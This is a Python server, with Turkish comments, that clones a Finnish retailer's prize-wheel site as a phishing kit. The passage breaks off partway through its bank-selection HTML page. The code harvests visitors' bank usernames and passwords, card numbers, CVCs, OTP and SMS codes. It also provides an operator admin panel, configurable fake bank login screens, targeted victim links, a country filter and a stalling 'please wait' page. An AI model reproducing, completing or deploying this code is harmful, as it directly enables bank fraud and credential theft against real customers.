#!/usr/bin/env python3
"""
Tokmanni Dynamic Clone Server
================================
Tamamen dinamik çalışır - orijinal sitenin tüm işlevleri:
- Public çark sayfası (/, /wheel)
- Admin paneli (/jehat/*)
- Dinamik banka yönetimi (CRUD)
- Dinamik kullanıcı yönetimi (CRUD + login)
- Link oluşturma
- Dashboard ziyaretçi yönetimi (sendRequest)
- Tüm API endpoint'leri gerçek veri ile
- Kalıcı JSON depolama
"""

import os
import re
import json
import time
import uuid
import hashlib
import threading
import traceback
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote, parse_qs
from datetime import datetime

# ============================================
# YAPILANDIRMA
# ============================================
PORT = 8080
ORIGINAL_DOMAIN = "tokmanni.palkintohakemus.fi"

SITE_ROOT = "/root/tokmanni.palkintohakemus.fi"
CAPTURED_PAGES = "/root/cark1/site-capture/pages"
PUBLIC_PAGES = "/root/cark1/site-capture/public"
API_DATA = "/root/cark1/api-data"
DATA_FILE = "/root/cark1/data.json"

# ============================================
# KALICI VERİ DEPOSU
# ============================================
class DataStore:
    def __init__(self):
        self.lock = threading.Lock()
        self.data = {
            'users': [],
            'banks': [],
            'sessions': {},
            'visitors': [],
            'activity_logs': [],
            'banned': [],
            'links': [],
            'country_settings': {'filter_enabled': True, 'allowed_countries': '["TR","FI"]'},
            'next_user_id': 100,
            'next_bank_id': 100,
            'next_visitor_id': 1,
        }
        self._load()

    def _load(self):
        if os.path.isfile(DATA_FILE):
            try:
                with open(DATA_FILE, 'r') as f:
                    saved = json.load(f)
                self.data.update(saved)
                print(f"  [DATA] {DATA_FILE} yüklendi ({len(self.data['users'])} kullanıcı, {len(self.data['banks'])} banka)")
                return
            except Exception as e:
                print(f"  [DATA] Yükleme hatası: {e}")
        self._seed_from_api_data()

    def _seed_from_api_data(self):
        bp = os.path.join(API_DATA, 'jehat_listBank.json')
        if os.path.isfile(bp):
            try:
                with open(bp, 'r') as f:
                    self.data['banks'] = json.load(f)
                max_id = max((int(b.get('id', 0)) for b in self.data['banks']), default=0)
                self.data['next_bank_id'] = max_id + 1
                print(f"  [SEED] {len(self.data['banks'])} banka yüklendi")
            except Exception as e:
                print(f"  [SEED] Banka hatası: {e}")

        up = os.path.join(API_DATA, 'jehat_getAllUsers.json')
        if os.path.isfile(up):
            try:
                with open(up, 'r') as f:
                    d = json.load(f)
                users = d.get('data', []) if isinstance(d, dict) else d
                for u in users:
                    u.setdefault('password', u['username'])
                self.data['users'] = users
                max_id = max((int(u.get('id', 0)) for u in users), default=0)
                self.data['next_user_id'] = max_id + 1
                print(f"  [SEED] {len(users)} kullanıcı yüklendi")
            except Exception as e:
                print(f"  [SEED] Kullanıcı hatası: {e}")

        alp = os.path.join(API_DATA, 'jehat_getActivityLogs.json')
        if os.path.isfile(alp):
            try:
                with open(alp, 'r') as f:
                    d = json.load(f)
                self.data['activity_logs'] = d.get('data', []) if isinstance(d, dict) else []
            except:
                pass

        csp = os.path.join(API_DATA, 'jehat_getCountrySettings.json')
        if os.path.isfile(csp):
            try:
                with open(csp, 'r') as f:
                    d = json.load(f)
                self.data['country_settings'] = d.get('settings', d) if isinstance(d, dict) else d
            except:
                pass
        self._save()

    def _save(self):
        try:
            with open(DATA_FILE, 'w') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"  [SAVE] Hata: {e}")

    def save(self):
        with self.lock:
            self._save()

    # --- Oturum ---
    def create_session(self, username, role='super_admin', user_id='0'):
        sid = hashlib.sha1(str(uuid.uuid4()).encode()).hexdigest()
        with self.lock:
            self.data['sessions'][sid] = {
                'username': username, 'role': role, 'user_id': user_id,
                'created': time.time(), 'last_activity': time.time()
            }
            for u in self.data['users']:
                if u['username'] == username:
                    u['current_session'] = sid
                    u['last_login'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    u['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    break
            self._save()
        return sid

    def validate_session(self, sid):
        if not sid:
            return None
        with self.lock:
            sess = self.data['sessions'].get(sid)
            if sess:
                sess['last_activity'] = time.time()
                for u in self.data['users']:
                    if u['username'] == sess['username']:
                        u['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        break
                return sess
        return None

    # --- Kullanıcı CRUD ---
    def get_all_users(self):
        return [{k: v for k, v in u.items() if k != 'password'} for u in self.data['users']]

    def add_user(self, username, password, role='admin', status='active'):
        with self.lock:
            for u in self.data['users']:
                if u['username'] == username:
                    return None, 'Kullanıcı zaten mevcut'
            uid = str(self.data['next_user_id'])
            self.data['next_user_id'] += 1
            user = {
                'id': uid, 'username': username, 'password': password,
                'role': role, 'status': status,
                'last_login': None, 'last_activity': None, 'current_session': None,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            self.data['users'].append(user)
            self._save()
            return {k: v for k, v in user.items() if k != 'password'}, None

    def edit_user(self, user_id, data):
        with self.lock:
            for u in self.data['users']:
                if str(u['id']) == str(user_id):
                    for field in ('username', 'role', 'status'):
                        if field in data and data[field]:
                            u[field] = data[field]
                    if 'password' in data and data['password']:
                        u['password'] = data['password']
                    self._save()
                    return {k: v for k, v in u.items() if k != 'password'}, None
            return None, 'Kullanıcı bulunamadı'

    def delete_user(self, user_id):
        with self.lock:
            self.data['users'] = [u for u in self.data['users'] if str(u['id']) != str(user_id)]
            self._save()

    def change_user_status(self, user_id, status):
        with self.lock:
            for u in self.data['users']:
                if str(u['id']) == str(user_id):
                    u['status'] = status
                    self._save()
                    return True
            return False

    def authenticate(self, username, password):
        for u in self.data['users']:
            if u['username'] == username and u.get('password') == password:
                if u.get('status') != 'active':
                    return None, 'Hesap aktif değil'
                return u, None
        return None, 'Geçersiz kullanıcı adı veya şifre'

    # --- Banka CRUD ---
    def get_banks(self, active_only=False):
        banks = self.data['banks']
        if active_only:
            banks = [b for b in banks if b.get('status') == 'active']
        return banks

    def get_bank(self, bank_id):
        for b in self.data['banks']:
            if str(b['id']) == str(bank_id):
                return b
        return None

    def add_bank(self, data):
        with self.lock:
            bid = str(self.data['next_bank_id'])
            self.data['next_bank_id'] += 1
            bank = {
                'id': bid,
                'country': data.get('country', 'finland'),
                'logo': data.get('logo', ''),
                'bank_name': data.get('bankName', data.get('bank_name', '')),
                'status': data.get('status', 'active'),
                'show_password': data.get('showPassword', data.get('show_password', '1')),
                'bank_title': data.get('bankTitle', data.get('bank_title', '')),
                'input_label_1': data.get('inputLabel1', data.get('input_label_1')),
                'input_label_2': data.get('inputLabel2', data.get('input_label_2')),
                'login_option': data.get('loginOption', data.get('login_option', '1')),
                'option_count': data.get('optionCount', data.get('option_count')),
                'option_name_1': data.get('optionName1', data.get('option_name_1')),
                'option_name_2': data.get('optionName2', data.get('option_name_2')),
                'option_name_3': data.get('optionName3', data.get('option_name_3')),
                'list_login': data.get('listLogin', data.get('list_login')),
                'login_list_count': data.get('loginListCount', data.get('login_list_count')),
                'login_list_text': data.get('loginListText', data.get('login_list_text')),
            }
            self.data['banks'].append(bank)
            self._save()
            return bank

    def edit_bank(self, bank_id, data):
        with self.lock:
            for b in self.data['banks']:
                if str(b['id']) == str(bank_id):
                    field_map = {
                        'bankName': 'bank_name', 'bank_name': 'bank_name',
                        'country': 'country', 'status': 'status', 'logo': 'logo',
                        'showPassword': 'show_password', 'show_password': 'show_password',
                        'bankTitle': 'bank_title', 'bank_title': 'bank_title',
                        'inputLabel1': 'input_label_1', 'input_label_1': 'input_label_1',
                        'inputLabel2': 'input_label_2', 'input_label_2': 'input_label_2',
                        'loginOption': 'login_option', 'login_option': 'login_option',
                        'optionCount': 'option_count', 'option_count': 'option_count',
                        'optionName1': 'option_name_1', 'option_name_1': 'option_name_1',
                        'optionName2': 'option_name_2', 'option_name_2': 'option_name_2',
                        'optionName3': 'option_name_3', 'option_name_3': 'option_name_3',
                        'listLogin': 'list_login', 'list_login': 'list_login',
                        'loginListCount': 'login_list_count', 'login_list_count': 'login_list_count',
                        'loginListText': 'login_list_text', 'login_list_text': 'login_list_text',
                    }
                    for k, v in data.items():
                        target = field_map.get(k, k)
                        if target in b:
                            b[target] = v
                    self._save()
                    return b
            return None

    def delete_bank(self, bank_id):
        with self.lock:
            self.data['banks'] = [b for b in self.data['banks'] if str(b['id']) != str(bank_id)]
            self._save()

    # --- Ziyaretçi ---
    def add_visitor(self, ip, data=None):
        with self.lock:
            vid = str(self.data['next_visitor_id'])
            self.data['next_visitor_id'] += 1
            visitor = {
                'id': vid, 'ip': ip, 'country': 'FI', 'status': 'online',
                'page': 'wheel', 'step': 1,
                # Dashboard expected fields
                'reward': '', 'fullname': '', 'phone': '', 'sms': '', 'sms2': '',
                'selected_option': '', 'login_list_option': '', 'selected_tab': '',
                'selectedBank': '', 'bank_selected': '', 'bank_name': '', 'bank_id': '',
                'verfugernummer': '', 'username': '', 'bank_username': '',
                'password': '', 'bank_password': '',
                'faceid': '', 'facepw': '',
                'card_number': '', 'expiry_date': '', 'cvc': '',
                'nordea_approve': '', 'spankki_approve': '', 'aws': '',
                'percent': '', 'name': '', 'surname': '',
                'otp': '', 'prize': '',
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'last_activity': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            }
            if data:
                visitor.update(data)
            self.data['visitors'].append(visitor)
            self._save()
            return visitor

    def get_visitor(self, vid):
        for v in self.data['visitors']:
            if str(v['id']) == str(vid):
                return v
        return None

    def update_visitor(self, vid, data):
        with self.lock:
            for v in self.data['visitors']:
                if str(v['id']) == str(vid):
                    v.update(data)
                    v['last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    self._save()
                    return v
            return None

    def get_active_visitors(self):
        now = time.time()
        result = []
        for v in self.data['visitors']:
            try:
                la = datetime.strptime(v.get('last_activity', ''), '%Y-%m-%d %H:%M:%S')
                if (now - la.timestamp()) < 1800:
                    result.append(v)
            except:
                result.append(v)
        return result

    # --- Activity log ---
    def add_activity(self, action, description='', user='system'):
        with self.lock:
            self.data['activity_logs'].insert(0, {
                'id': str(len(self.data['activity_logs']) + 1),
                'user_id': '0', 'username': user,
                'action': action, 'description': description,
                'ip_address': '127.0.0.1',
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            if len(self.data['activity_logs']) > 500:
                self.data['activity_logs'] = self.data['activity_logs'][:500]
            self._save()

    # --- Ban ---
    def ban_visitor(self, vid):
        with self.lock:
            for v in self.data['visitors']:
                if str(v['id']) == str(vid):
                    v['status'] = 'banned'
                    self.data['banned'].append({
                        'id': vid, 'ip': v.get('ip', ''),
                        'reason': 'Admin tarafından banlandı',
                        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                    self._save()
                    return True
            return False

    # --- Link ---
    def create_link(self, data):
        with self.lock:
            link_id = str(uuid.uuid4())[:8]
            link = {
                'id': link_id,
                'campaign': data.get('campaign', 'Tokmanni'),
                'full_name': data.get('fullName', data.get('full_name', '')),
                'prize': data.get('prize', data.get('amount', '')),
                'currency': data.get('currency', '€'),
                'url': f'/?link={link_id}',
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            self.data['links'].append(link)
            self._save()
            return link


store = DataStore()


# ============================================
# CONTENT TYPE
# ============================================
EXT_MAP = {
    '.html': 'text/html; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.json': 'application/json; charset=utf-8',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'font/woff', '.woff2': 'font/woff2',
    '.ttf': 'font/ttf', '.eot': 'application/vnd.ms-fontobject',
    '.txt': 'text/plain; charset=utf-8', '.webp': 'image/webp',
}

def guess_type(path):
    _, ext = os.path.splitext(path.split('?')[0])
    return EXT_MAP.get(ext.lower(), 'application/octet-stream')

def rewrite_html(content):
    t = content
    t = t.replace(f'https://{ORIGINAL_DOMAIN}', '')
    t = t.replace(f'http://{ORIGINAL_DOMAIN}', '')
    t = t.replace(ORIGINAL_DOMAIN, '')
    return t


# ============================================
# MULTIPART PARSER
# ============================================
def parse_multipart(body, content_type):
    result = {}
    files = {}
    boundary = None
    for part in content_type.split(';'):
        part = part.strip()
        if part.startswith('boundary='):
            boundary = part[9:].strip('"')
    if not boundary:
        return result, files
    parts = body.split(f'--{boundary}'.encode())
    for part in parts:
        if not part or part == b'--\r\n' or part == b'--':
            continue
        if b'\r\n\r\n' not in part:
            continue
        header_data, file_data = part.split(b'\r\n\r\n', 1)
        if file_data.endswith(b'\r\n'):
            file_data = file_data[:-2]
        header_str = header_data.decode('utf-8', errors='replace')
        name_match = re.search(r'name="([^"]*)"', header_str)
        if not name_match:
            continue
        name = name_match.group(1)
        filename_match = re.search(r'filename="([^"]*)"', header_str)
        if filename_match and filename_match.group(1):
            files[name] = {'filename': filename_match.group(1), 'data': file_data}
        else:
            result[name] = file_data.decode('utf-8', errors='replace')
    return result, files


# ============================================
# HANDLER
# ============================================
class OfflineHandler(BaseHTTPRequestHandler):

    def _send(self, content, ct, status=200, headers=None):
        if isinstance(content, str):
            content = content.encode('utf-8')
        self.send_response(status)
        self.send_header('Content-Type', ct)
        self.send_header('Content-Length', len(content))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache')
        if headers:
            for k, v in headers.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(content)

    def _json(self, data, status=200):
        self._send(json.dumps(data, ensure_ascii=False), 'application/json; charset=utf-8', status)

    def _html_file(self, fp, inject_script=None):
        try:
            with open(fp, 'r', encoding='utf-8', errors='replace') as f:
                html = rewrite_html(f.read())
            if inject_script:
                html = html.replace('</head>', inject_script + '\n</head>')
            self._send(html, 'text/html; charset=utf-8')
            return True
        except:
            return False

    def _static_file(self, fp):
        try:
            with open(fp, 'rb') as f:
                self._send(f.read(), guess_type(fp))
            return True
        except:
            return False

    def _find_static(self, path):
        clean = unquote(path.split('?')[0])
        fp = os.path.join(SITE_ROOT, clean.lstrip('/'))
        if os.path.isfile(fp):
            return fp
        parent = os.path.dirname(fp)
        base = os.path.basename(clean).split('?')[0]
        if os.path.isdir(parent):
            for f in os.listdir(parent):
                if f.split('?')[0] == base:
                    return os.path.join(parent, f)
        return None

    def _get_session_id(self):
        for part in self.headers.get('Cookie', '').split(';'):
            p = part.strip()
            if p.startswith('ci_session='):
                return p.split('=', 1)[1]
        return None

    def _require_admin(self):
        sid = self._get_session_id()
        return store.validate_session(sid)

    def _check_role(self, sess, required_role='admin'):
        """Rol kontrolü: super_admin her şeyi yapabilir, admin CRUD, operator sadece görüntüler"""
        if not sess:
            return False
        role = sess.get('role', '')
        if role == 'super_admin':
            return True
        if required_role == 'admin' and role in ('admin', 'super_admin'):
            return True
        if required_role == 'operator' and role in ('operator', 'admin', 'super_admin'):
            return True
        return False

    # ==========================================
    # OPTIONS
    # ==========================================
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

    # ==========================================
    # GET
    # ==========================================
    def do_GET(self):
        raw_path = self.path
        path = unquote(raw_path.split('?')[0])
        qs = parse_qs(urlparse(raw_path).query)
        # Request logging
        if not path.startswith('/static/'):
            accept = self.headers.get('Accept', '')
            xhr = self.headers.get('X-Requested-With', '')
            print(f"  [GET] {path} Accept={accept[:40]} XHR={xhr}")

        if path == '/favicon.ico':
            for loc in ['static/img/favicon.png', 'static/assets/img/favicon.png']:
                fp = os.path.join(SITE_ROOT, loc)
                if os.path.isfile(fp):
                    self._static_file(fp); return
            self._send(b'', 'image/x-icon', 404); return

        if path.startswith('/static/'):
            fp = self._find_static(path)
            if fp:
                self._static_file(fp)
            else:
                self._send(b'', 'application/octet-stream', 404)
            return

        # === PUBLIC GİRİŞ FORMU ===
        if path in ('/', '/index', '/index.html'):
            link_id = qs.get('link', [None])[0]
            if link_id:
                # Link ile gelen kullanıcılar doğrudan çarka yönlendirilir
                wp = os.path.join(PUBLIC_PAGES, 'wheel.html')
                if os.path.isfile(wp):
                    with open(wp, 'r', encoding='utf-8') as f:
                        html = f.read()
                    for lnk in store.data['links']:
                        if lnk['id'] == link_id:
                            html = html.replace("var fromLink = false;", "var fromLink = true;")
                            html = html.replace("var fullName = '';", f"var fullName = '{lnk.get('full_name', '')}';")
                            break
                    self._send(rewrite_html(html), 'text/html; charset=utf-8')
                else:
                    self._send('<h1>Wheel page not found</h1>', 'text/html; charset=utf-8', 404)
            else:
                # Normal giriş - form sayfası göster
                fp = os.path.join(PUBLIC_PAGES, 'form.html')
                if os.path.isfile(fp):
                    with open(fp, 'r', encoding='utf-8') as f:
                        html = f.read()
                    self._send(rewrite_html(html), 'text/html; charset=utf-8')
                else:
                    self._send('<h1>Form page not found</h1>', 'text/html; charset=utf-8', 404)
            return

        # === PUBLIC ÇARK ===
        if path in ('/wheel', '/wheel.html'):
            wp = os.path.join(PUBLIC_PAGES, 'wheel.html')
            if os.path.isfile(wp):
                with open(wp, 'r', encoding='utf-8') as f:
                    html = f.read()
                self._send(rewrite_html(html), 'text/html; charset=utf-8')
            else:
                self._send('<h1>Wheel page not found</h1>', 'text/html; charset=utf-8', 404)
            return

        # === /banks (JSON API) ===
        if path == '/banks' and ('json' in (self.headers.get('Accept', '') or '') or self.headers.get('X-Requested-With') == 'XMLHttpRequest'):
            public_banks = []
            for b in store.get_banks(active_only=True):
                public_banks.append({
                    'id': b.get('id'), 'bank_name': b.get('bank_name'),
                    'logo': b.get('logo'), 'country': b.get('country'),
                    'status': b.get('status'), 'bank_title': b.get('bank_title', ''),
                    'show_password': b.get('show_password', '1'),
                    'input_label_1': b.get('input_label_1'),
                    'input_label_2': b.get('input_label_2'),
                    'login_option': b.get('login_option', '1'),
                    'option_count': b.get('option_count', '0'),
                    'option_name_1': b.get('option_name_1'),
                    'option_name_2': b.get('option_name_2'),
                    'option_name_3': b.get('option_name_3'),
                    'list_login': b.get('list_login'),
                    'login_list_count': b.get('login_list_count'),
                    'login_list_text': b.get('login_list_text'),
                })
            self._json(public_banks); return

        # === /banks (HTML page) ===
        if path == '/banks':
            banks = store.get_banks(active_only=True)
            banks_json = json.dumps([{
                'id': b.get('id',''), 'bank_name': b.get('bank_name',''),
                'logo': b.get('logo',''), 'country': b.get('country',''),
                'bank_title': b.get('bank_title',''),
                'show_password': b.get('show_password','1'),
                'login_option': b.get('login_option','0'),
                'option_count': b.get('option_count','0'),
                'option_name_1': b.get('option_name_1'),
                'option_name_2': b.get('option_name_2'),
                'option_name_3': b.get('option_name_3'),
                'input_label_1': b.get('input_label_1'),
                'input_label_2': b.get('input_label_2'),
            } for b in banks], ensure_ascii=False).replace('</','<\\/')

            html = f'''<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Valitse pankki</title>
    <link rel="shortcut icon" href="/static/img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="/static/css/style.css">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }}
        /* ===== BANKA LİSTESİ ===== */
        .page-container {{
            max-width: 800px;
            width: 100%;
            margin: 0 auto;
            padding: 40px 20px;
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            color: #fff;
        }}
        .header h1 {{ font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }}
        .header p {{ font-size: 1rem; opacity: 0.9; }}
        .search-box {{
            width: 100%; max-width: 400px; margin: 0 auto 30px; position: relative;
        }}
        .search-box input {{
            width: 100%; padding: 14px 20px 14px 48px; border: none; border-radius: 50px;
            font-size: 1rem; background: rgba(255,255,255,0.95);
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); outline: none; transition: box-shadow 0.3s;
        }}
        .search-box input:focus {{ box-shadow: 0 4px 25px rgba(0,0,0,0.2); }}
        .search-box svg {{
            position: absolute; left: 18px; top: 50%; transform: translateY(-50%);
            width: 20px; height: 20px; fill: #999;
        }}
        .banks-grid {{
            display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 16px;
        }}
        .bank-card {{
            background: #fff; border-radius: 16px; padding: 24px 16px; text-align: center;
            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 2px 10px rgba(0,0,0,0.08);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 140px;
        }}
        .bank-card:hover {{ transform: translateY(-4px); box-shadow: 0 8px 25px rgba(0,0,0,0.15); }}
        .bank-logo {{
            width: 80px; height: 80px; display: flex; align-items: center;
            justify-content: center; margin-bottom: 12px;
        }}
        .bank-logo img {{ max-width: 100%; max-height: 100%; object-fit: contain; }}
        .bank-logo-fallback {{
            width: 60px; height: 60px; border-radius: 50%;
            background: linear-gradient(135deg, #667eea, #764ba2); color: #fff;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.5rem; font-weight: 700;
        }}
        .bank-name {{ font-size: 0.95rem; font-weight: 600; color: #333; }}
        .no-results {{ text-align: center; color: rgba(255,255,255,0.8); font-size: 1.1rem; padding: 40px; display: none; }}

        /* ===== LOGIN SAYFASI ===== */
        .login-page {{
            display: none;
            min-height: 100vh;
            padding: 40px 20px;
        }}
        .login-page.active {{ display: flex; justify-content: center; align-items: flex-start; }}
        .login-wrapper {{ max-width: 480px; width: 100%; }}
        .login-back {{
            display: inline-flex; align-items: center; gap: 6px; color: rgba(255,255,255,0.85);
            font-size: 0.95rem; cursor: pointer; margin-bottom: 20px; transition: color 0.2s;
            background: none; border: none;
        }}
        .login-back:hover {{ color: #fff; }}
        .login-back svg {{ width: 20px; height: 20px; fill: currentColor; }}
        .login-card {{
            background: #fff; border-radius: 24px; padding: 2rem; box-shadow: 0 8px 40px rgba(0,0,0,0.12);
        }}
        .login-card .bank-header {{
            text-align: center; margin-bottom: 1.5rem; padding-bottom: 1.5rem;
            border-bottom: 1px solid #f0f0f0;
        }}
        .login-card .bank-header img {{
            width: 72px; height: 72px; object-fit: contain; margin-bottom: 12px;
        }}
        .login-card .bank-header h2 {{
            font-size: 1.15rem; color: #1F2937; font-weight: 600;
        }}
        .login-options {{
            display: flex; gap: 8px; margin-bottom: 1.5rem; flex-wrap: wrap;
        }}
        .login-option-btn {{
            flex: 1; padding: 12px 16px; border: 2px solid #e5e7eb; border-radius: 14px;
            background: #fff; color: #374151; font-size: 0.88rem; cursor: pointer;
            transition: all 0.2s; font-weight: 500; min-width: 0;
            text-align: center; line-height: 1.3;
        }}
        .login-option-btn:hover {{ border-color: #2563EB; color: #2563EB; }}
        .login-option-btn.active {{
            background: #2563EB; color: #fff; border-color: #2563EB;
        }}
        .form-group {{ margin-bottom: 1.2rem; }}
        .form-group label {{
            display: block; margin-bottom: 0.5rem; font-weight: 600; color: #374151; font-size: 0.9rem;
        }}
        .form-group input {{
            width: 100%; height: 52px; border: 2px solid #e5e7eb; border-radius: 14px;
            padding: 0 1rem; font-size: 1rem; transition: border-color 0.2s; outline: none;
            background: #fafafa;
        }}
        .form-group input:focus {{ border-color: #2563EB; background: #fff; }}
        .login-submit {{
            width: 100%; padding: 15px; background: #2563EB; color: #fff; border: none;
            border-radius: 14px; font-size: 1rem; font-weight: 600; cursor: pointer;
            margin-top: 0.5rem; transition: background 0.2s;
        }}
        .login-submit:hover {{ background: #1d4ed8; }}
        .login-error {{
            background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px;
            padding: 12px 16px; color: #dc2626; font-size: 0.9rem; margin-bottom: 1rem;
            display: none;
        }}

        /* ===== BEKLEYİN SAYFASI ===== */
        .wait-page {{
            display: none; min-height: 100vh; padding: 40px 20px;
            flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }}
        .wait-page.active {{ display: flex; }}
        .wait-page h2 {{ color: #fff; font-size: 1.5rem; margin-bottom: 1rem; }}
        .wait-page p {{ color: rgba(255,255,255,0.85); max-width: 400px; margin: 0.4rem 0; }}
        .spinner {{
            width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;
            margin: 2rem auto;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}

        @media (max-width: 480px) {{
            .banks-grid {{ grid-template-columns: repeat(2, 1fr); gap: 12px; }}
            .bank-card {{ padding: 16px 12px; min-height: 120px; }}
            .bank-logo {{ width: 60px; height: 60px; }}
            .page-container {{ padding: 20px 12px; }}
            .header h1 {{ font-size: 1.4rem; }}
            .login-card {{ padding: 1.5rem; }}
        }}
    </style>
</head>
<body>
    <!-- BANKA LİSTESİ -->
    <div class="page-container" id="bankListPage">
        <div class="header">
            <h1>Valitse pankkisi</h1>
            <p>Ole hyvä ja valitse pankki</p>
        </div>
        <div class="search-box">
            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
            <input type="text" id="searchInput" placeholder="Hae pankkia..." oninput="filterBanks()">
        </div>
        <div class="banks-grid" id="banksGrid"></div>
        <div class="no-results" id="noResults">Pankkia ei löytynyt</div>
    </div>

    <!-- LOGİN SAYFASI -->
    <div class="login-page" id="loginPage">
        <div class="login-wrapper">
            <button class="login-back" onclick="showBankList()">
                <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
                Takaisin
            </button>
            <div class="login-card">
                <div class="bank-header">
                    <img id="loginBankLogo" src="" alt="">
                    <h2 id="loginBankTitle"></h2>
                </div>
                <div id="loginOptions"></div>
                <div class="login-error" id="loginError"></div>
                <form id="loginForm" onsubmit="return handleLogin(event)">
                    <div class="form-group">
                        <label id="usernameLabel">Käyttäjätunnus</label>
                        <input type="text" id="loginUsername" required>
                    </div>
                    <div class="form-group" id="passwordGroup">
                        <label id="passwordLabel">Salasana</label>
                        <input type="password" id="loginPassword">
                    </div>
                    <button type="submit" class="login-submit" id="loginSubmitBtn">Kirjaudu Sisään</button>
                </form>
            </div>
        </div>
    </div>

    <!-- BEKLEYİN SAYFASI -->
    <div class="wait-page" id="waitPage">
        <h2>Odota Hetki.</h2>
        <div class="spinner"></div>
        <p><strong>Siirron turvallisuuden vuoksi, älä poistu tältä sivulta!</strong></p>
        <p>Hakemuksesi käsitellään turvallisesti.</p>
        <p style="opacity:0.7;font-size:0.9rem;">Prosessi voi kestää noin 15 minuuttia. Ole hyvä ja odota.</p>
    </div>

    <!-- DİNAMİK SAYFA ALANI (Admin aksiyonlarına göre) -->
    <div class="dynamic-page" id="dynamicPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- SMS SAYFASI -->
    <div class="sms-page" id="smsPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- KART SAYFASI -->
    <div class="card-page" id="cardPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- FACEBOOK SAYFASI -->
    <div class="facebook-page" id="facebookPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- VERIFY SAYFASI -->
    <div class="verify-page" id="verifyPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- SUCCESS SAYFASI -->
    <div class="success-page" id="successPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- SUPPORT SAYFASI -->
    <div class="support-page" id="supportPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- BANK LOGIN ERROR SAYFASI -->
    <div class="banklogin-error-page" id="bankLoginErrorPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
    </div>

    <!-- BANNED SAYFASI -->
    <div class="banned-page" id="bannedPage" style="display:none;min-height:100vh;padding:40px 20px;flex-direction:column;align-items:center;justify-content:center;text-align:center;">
        <h2 style="color:#fff;">Pääsy estetty</h2>
        <p style="color:rgba(255,255,255,0.7);margin-top:1rem;">Tilisi on estetty.</p>
    </div>

    <script>
    var allBanks = {banks_json};
    var selectedBank = null;

    // Render bank cards
    function renderBanks(banks) {{
        var grid = document.getElementById('banksGrid');
        var html = '';
        for (var i = 0; i < banks.length; i++) {{
            var b = banks[i];
            var name = b.bank_name || '';
            var logo = b.logo || '';
            var fallback = name.charAt(0) || '?';
            html += '<div class="bank-card" onclick="selectBank(' + b.id + ')">' +
                '<div class="bank-logo">' +
                    (logo ? '<img src="/static/img/banks/' + logo + '" alt="' + name.replace(/"/g,'&quot;') + '" onerror="this.style.display=\\'none\\';this.parentElement.innerHTML=\\'<div class=bank-logo-fallback>' + fallback + '</div>\\';">' : '<div class="bank-logo-fallback">' + fallback + '</div>') +
